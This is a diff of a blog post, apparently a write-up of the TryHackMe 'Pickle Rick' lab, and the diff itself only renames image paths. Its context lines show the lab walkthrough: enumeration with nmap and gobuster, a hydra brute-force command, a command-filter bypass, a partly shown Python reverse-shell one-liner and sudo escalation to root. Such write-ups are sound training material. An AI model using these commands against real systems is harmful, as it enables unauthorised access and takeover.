@@ -3,7 +3,7 @@ title: "Pickle Rick - TryHackMe Write-up"
 description: "A write-up of the pickle rick room on TryHackMe."
 date: "2026-02-10"
 readTime: "10 min read"
-image: "/assets/images/posts/pickle-rick/cover.png"
+image: "/assets/images/posts/pickle_rick/cover.png"
 slug: "pickle-rick-thm-writeup"
 author: "oscar lara"
 ---
@@ -19,7 +19,7 @@ author: "oscar lara"
 ### Nmap Scan
 First, I added the machine IP address to `/etc/hosts` and assigned it a domain name. Then, I enumerated all open ports on the target machine. For this, I used my own script, which automates an `nmap` scan and generates two output files.
 
-![enum](/assets/images/posts/pickle-rick/pr01_nmap.png)
+![enum](/assets/images/posts/pickle_rick/pr01_nmap.png)
 
 ```sh
 # Nmap 7.95 scan initiated Sat Feb 28 13:14:52 2026 as: /usr/lib/nmap/nmap -sC -sV -p22,80 -Pn -oN services.txt picklerick.thm
@@ -51,9 +51,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### Web Enumeration
 Port **80** was open, so I accessed the web server to explore it further. The page itself did not provide much useful information. However, after inspecting the page source code, I found a comment containing the username: `R1ckRul3s`
 
-![main_page](/assets/images/posts/pickle-rick/pr02_main_page.png)
+![main_page](/assets/images/posts/pickle_rick/pr02_main_page.png)
 
-![comment](/assets/images/posts/pickle-rick/pr03_comment.png)
+![comment](/assets/images/posts/pickle_rick/pr03_comment.png)
 
 Since no additional information was found on the main page, I performed directory enumeration to discover hidden endpoints.
 
@@ -61,16 +61,16 @@ Since no additional information was found on the main page, I performed director
 gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip,tar,old
 ```
 
-![gobuster](/assets/images/posts/pickle-rick/pr04_gobuster.png)
+![gobuster](/assets/images/posts/pickle_rick/pr04_gobuster.png)
 
 ### **Findings:**
 The first interesting discovery was a `login.php` page.
 
-![login](/assets/images/posts/pickle-rick/pr05_login.png)
+![login](/assets/images/posts/pickle_rick/pr05_login.png)
 
 Additionally, after reviewing the `robots.txt` file, I found what initially seemed like a funny Easter egg — Rick’s famous phrase: `Wubbalubbadubdub`
 
-![robots](/assets/images/posts/pickle-rick/pr06_robots.png)
+![robots](/assets/images/posts/pickle_rick/pr06_robots.png)
 
 At this point, it didn’t seem important, but it later turned out to be very relevant.
 
@@ -80,7 +80,7 @@ At this point, it didn’t seem important, but it later turned out to be very re
 ### Brute Force Attemps
 First, I attempted to brute force the SSH service using `hydra` and the previously discovered username. However, SSH password authentication was disabled.
 
-![ssh](/assets/images/posts/pickle-rick/pr07_ssh.png)
+![ssh](/assets/images/posts/pickle_rick/pr07_ssh.png)
 
 Next, I tried brute-forcing the login page and supposedly there are 16 valid passwords, to no one's surprise, none of them works.
 
@@ -88,7 +88,7 @@ Next, I tried brute-forcing the login page and supposedly there are 16 valid pas
 hydra -l R1ckRul3s -P /usr/share/wordlist/rockyou.txt picklerick.thm http-post-form "/login.php:username^USER^&password=^PASS^:F=invalid" -V
 ```
 
-![hydra](/assets/images/posts/pickle-rick/pr08_hydra.png)
+![hydra](/assets/images/posts/pickle_rick/pr08_hydra.png)
 
 At this point, I reconsidered the information gathered during enumeration. I remembered the supposed Easter egg in `robots.txt` and realized that it might actually be the password.
 ### Initial Access
@@ -99,13 +99,13 @@ I successfully logged into the portal.
 
 In the portal page we found a panel were we can execute almost any command
 
-![portal](/assets/images/posts/pickle-rick/pr09_portal.png)
+![portal](/assets/images/posts/pickle_rick/pr09_portal.png)
 
 Since commands such as `cat`, `more`, `base64` and more were filtered we can try to bypass the filter using quotation marks
 
-![command_disabled](/assets/images/posts/pickle-rick/pr10_command_disabled.png)
+![command_disabled](/assets/images/posts/pickle_rick/pr10_command_disabled.png)
 
-![command_bypass](/assets/images/posts/pickle-rick/pr11_command_bypass.png)
+![command_bypass](/assets/images/posts/pickle_rick/pr11_command_bypass.png)
 
 Eventually, to avoid filter limitations entirely, I obtained a reverse shell using Python:
 
@@ -120,7 +120,7 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.137.54",4
 
 Once inside the system, I checked whether the current user had sudo privileges:
 
-![sudo](/assets/images/posts/pickle-rick/pr12_sudo.png)
+![sudo](/assets/images/posts/pickle_rick/pr12_sudo.png)
 
 Owing to the user can run any command with sudo without requiring a password, obtain a root shell was really easy.
 
@@ -128,7 +128,7 @@ Owing to the user can run any command with sudo without requiring a password, ob
 sudo sh
 ```
 
-![root](/assets/images/posts/pickle-rick/pr13_root.png)
+![root](/assets/images/posts/pickle_rick/pr13_root.png)
 
 **Escalated to:** `root`
 
